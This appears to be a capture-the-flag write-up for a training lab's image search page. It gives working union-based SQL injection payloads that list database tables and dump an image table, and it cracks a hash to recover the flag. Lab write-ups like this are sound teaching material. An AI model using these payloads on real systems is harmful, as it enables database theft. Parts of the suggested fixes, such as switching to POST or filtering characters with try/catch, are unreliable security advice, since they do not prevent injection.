# 05-SQL_Image_Search

The image search is vulnerable to sql injections

## The approach

- Go to http://192.168.42.238/?page=searching

- On the search field, type `1 AND 1=1`and press search button 

- Type this union command on the filed: `-1 union select null, concat (table_name) from information_schema.tables where table_schema = database ()`. this returns table name which is list_images.

- type on the field ` -1 union select NULL, concat (id, url, title, comment) from list_images`. this returns  images from the table.

- from the results you get ( " If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46 " decrypt code using MD5 decrypt, then run sha256 on lowercased password: flag is result )

- copy this 1928e8083cf461a51303633093573c46 to a md5 decoder then get the albatroz result to sha256 to get the flag.

## The Exploit #

Users can exploit and destroy sensitive information on your database

## The solution

- Use prepared statements in the backend to prevent sql injections 
- Send form as post request
- try and catch methods should prevent charecters like (', <, ", ?) images shouldnt begin with that type of name.

## Resources

https://www.md5online.org/md5-decrypt.html  
sha256-hash-generator/ 

https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#InlineSamples